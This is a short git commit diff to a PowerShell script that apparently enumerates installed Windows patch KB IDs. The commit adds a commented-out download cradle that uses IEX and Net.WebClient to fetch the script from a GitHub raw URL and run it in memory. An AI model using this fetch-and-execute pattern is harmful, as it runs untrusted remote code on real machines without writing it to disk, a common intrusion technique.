3a6d0d6e8fd76f02a34dce249a753a3d0911b5c8
Viky <vchoi@softwaresecured.com>
2024-10-31 16:03:25 -0700

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -1,3 +1,4 @@
+#powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/ss-vchoi/L5Ac4sgdA7r8KnhifupkHIpk6HTOZ4lC/refs/heads/main/a.ps1')"
 # Gather KB from all patches installed
 function returnHotFixID {
   param(
